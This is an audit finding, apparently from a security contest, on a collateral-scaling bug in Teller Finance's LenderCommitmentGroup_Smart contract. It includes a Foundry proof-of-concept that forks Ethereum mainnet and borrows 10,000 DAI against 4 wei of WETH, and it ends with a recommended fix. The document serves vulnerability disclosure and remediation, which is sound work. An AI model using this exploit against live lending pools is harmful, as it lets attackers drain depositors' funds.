---
id: 25670
severity: "Crit/High"
---

# Drained lender due to LenderCommitmentGroup_Smart::acceptFundsForAcceptBid() _collateralAmount by STANDARD_EXPANSION_FACTOR multiplication

## Description



## Proof of Concept

## Vulnerability Detail

Uniswap `sqrtPriceX96` is `token1 / token0  296 `***, which if squared and divided by `(2`**`96)^2` equals `token1 / token0`. `LenderCommitmentGroup_Smart::_getPriceFromSqrtX96()` computes `uint256 priceX96 = (uint256(_sqrtPriceX96) `*` uint256(_sqrtPriceX96)) / (296);`**, which still has `2`**`96` extra precision. Then in `LenderCommitmentGroup_Smart::token0ToToken1()` and `LenderCommitmentGroup_Smart::token1ToToken0()`, the `296`** factor is eliminated by multiplying or dividing by `2`**`96`, respectively (`UNISWAP_EXPANSION_FACTOR`).

Thus, `LenderCommitmentGroup_Smart::getCollateralRequiredForPrincipalAmount()` returns `token1 / token0` (or `token0 / token1` if the principal is `token1`), which is not multiplied by a factor of `STANDARD_EXPANSION_FACTOR`, as the code implies.

This means that an user needs `STANDARD_EXPANSION_FACTOR == 1e18` times less collateral than supposed to borrow.

A test was carried out to confirm the behaviour. An user borrows `10_000e18 DAI` with `4 WETH`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2 as console} from "forge-std/Test.sol";

import {LenderCommitmentGroup_Smart} from "../../../../contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol";
import {TellerV2} from "../../../../contracts/TellerV2.sol";
import {MarketRegistry} from "../../../../contracts/MarketRegistry.sol";
import {ReputationManager} from "../../../../contracts/ReputationManager.sol";
import {SmartCommitmentForwarder} from "../../../../contracts/LenderCommitmentForwarder/SmartCommitmentForwarder.sol";
import {CollateralEscrowV1} from "../../../../contracts/escrow/CollateralEscrowV1.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {CollateralManager} from "../../../../contracts/CollateralManager.sol";
import {LenderManager} from "../../../../contracts/LenderManager.sol";
import {EscrowVault} from "../../../../contracts/EscrowVault.sol";
import {IMarketRegistry} from "../../../../contracts/interfaces/IMarketRegistry.sol";
import {IASRegistry} from "../../../../contracts/interfaces/IASRegistry.sol";
import {IEASEIP712Verifier} from "../../../../contracts/interfaces/IEASEIP712Verifier.sol";
import {TellerASRegistry} from "../../../../contracts/EAS/TellerASRegistry.sol";
import {TellerASEIP712Verifier} from "../../../../contracts/EAS/TellerASEIP712Verifier.sol";
import {TellerAS} from "../../../../contracts/EAS/TellerAS.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {PaymentType, PaymentCycleType} from "../../../../contracts/libraries/V2Calculations.sol";

contract LenderCommitmentGroup_Smart_test is Test {
    LenderCommitmentGroup_Smart lender;
    TellerV2 tellerV2;
    MarketRegistry marketRegistry;
    ReputationManager reputationManager;
    SmartCommitmentForwarder smartCommitmentForwarder;
    CollateralEscrowV1 escrowImplementation;
    UpgradeableBeacon escrowBeacon;
    CollateralManager collateralManager;
    LenderManager lenderManager;
    EscrowVault escrowVault;
    ERC20 DAI;
    ERC20 WETH;
    address attacker;
    address user;
    uint256 marketId;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 19739232);

        DAI = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        vm.label(address(DAI), "DAI");
        vm.label(address(WETH), "WETH");

        attacker = makeAddr("attacker");
        user = makeAddr("user");

        address trustedForwarder = address(0);
        tellerV2 = new TellerV2(trustedForwarder);

        uint16 _protocolFee = 100;

        IASRegistry iasRegistry = new TellerASRegistry();
        IEASEIP712Verifier ieaseip712verifier = new TellerASEIP712Verifier();

        TellerAS tellerAS = new TellerAS((iasRegistry), (ieaseip712verifier));
        marketRegistry = new MarketRegistry();

        marketRegistry.initialize(tellerAS);

        reputationManager = new ReputationManager();

        smartCommitmentForwarder = new SmartCommitmentForwarder(
                address(tellerV2),
                address(marketRegistry)
            );

        escrowImplementation = new CollateralEscrowV1();

        escrowBeacon = new UpgradeableBeacon(
            address(escrowImplementation)
        );

        collateralManager = new CollateralManager();

        lenderManager = new LenderManager(
            IMarketRegistry(marketRegistry)
        );

        escrowVault = new EscrowVault();

        collateralManager.initialize(address(escrowBeacon), address(tellerV2));

        lenderManager.initialize();

        reputationManager.initialize(address(tellerV2));

        tellerV2.initialize(
            _protocolFee,
            address(marketRegistry),
            address(reputationManager),
            address(smartCommitmentForwarder),
            address(collateralManager),
            address(lenderManager),
            address(escrowVault)
        );

        lender = new LenderCommitmentGroup_Smart(
            address(tellerV2),
            address(smartCommitmentForwarder),
            0x1F98431c8aD98523631AE4a59f267346ea31F984
        );

        address marketOwner = makeAddr("marketOwner");
        vm.prank(marketOwner);
        marketId = marketRegistry.createMarket(
            marketOwner,
            1 days,
            5 days,
            7 days,
            900,
            false,
            false,
            PaymentType.EMI,
            PaymentCycleType.Seconds,
            "uri"
        );

        lender.initialize(
            address(DAI),
            address(WETH),
            marketId,
            5000000,
            0,
            800,
            10000,
            10000,
            3000,
            5
        );
    }

    function test_POC_Wrong_STANDARD_EXPANSION_FACTOR_multiplication() public {
        uint256 principalAmount = 10_000e18;
        deal(address(DAI), attacker, principalAmount);
        vm.startPrank(attacker);

        // add principal to lender to get shares
        DAI.approve(address(lender), principalAmount);
        lender.addPrincipalToCommitmentGroup(principalAmount, attacker);

        // approve the forwarder
        tellerV2.approveMarketForwarder(marketId, address(smartCommitmentForwarder));

        // borrow the principal
        uint256 collateralAmount = 4;
        deal(address(WETH), attacker, collateralAmount);
        WETH.approve(address(collateralManager), collateralAmount);
        smartCommitmentForwarder.acceptCommitmentWithRecipient(
            address(lender),
            principalAmount,
            collateralAmount,
            0,
            address(WETH),
            attacker,
            0,
            2 days
        );

        vm.stopPrank();
    }
}
```

## Impact

Drained `LenderCommitmentGroup_Smart` as borrowers may borrow all the `principal` with a dust amount of collateral, disincentivizing liquidations.

## Code Snippet

[LenderCommitmentGroup_Smart::acceptFundsForAcceptBid()](<https://github.com/sherlock-audit/2024-04-teller-finance/blob/main/teller-protocol-v2-audit-2024/packages/contracts/contracts/LenderCommitmentForwarder/extensions/LenderCommitmentGroup/LenderCommitmentGroup_Smart.sol#L367-L371>)

```solidity
require(
    (_collateralAmount * STANDARD_EXPANSION_FACTOR) >=
        requiredCollateral,
    "Insufficient Borrower Collateral"
);
```

## Recommendation

Remove `STANDARD_EXPANSION_FACTOR` from the collateral calculation

```solidity
require(
    _collateralAmount >=
        requiredCollateral,
    "Insufficient Borrower Collateral"
);
```
